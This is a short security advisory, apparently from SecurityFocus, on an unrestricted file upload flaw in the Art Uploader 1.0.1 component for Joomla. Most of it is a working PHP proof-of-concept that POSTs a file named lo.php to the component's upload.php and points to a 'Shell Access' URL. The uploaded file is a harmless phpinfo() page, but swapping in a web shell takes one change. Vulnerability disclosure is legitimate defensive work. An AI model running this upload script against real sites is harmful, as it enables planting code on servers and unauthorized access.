source: http://www.securityfocus.com/bid/53969/info

The Art Uploader component for Joomla! is prone to a vulnerability that lets attackers upload arbitrary files because the application fails to adequately sanitize user-supplied input.

An attacker can exploit this vulnerability to upload arbitrary code and run it in the context of the web server process. This may facilitate unauthorized access or privilege escalation; other attacks are also possible.

Art Uploader 1.0.1 is vulnerable; other versions may also be affected. 

<?php

$uploadfile="lo.php";
$ch = 
curl_init("http://www.example.com/modules/mod_artuploader/upload.php");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS,
         array('userfile'=>"@$uploadfile",
                'path'=>'./'));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);
print "$postResult";

?>

Shell Access : http://www.example.com/modules/mod_artuploader/lo.php

lo.php
<?php
phpinfo();
?>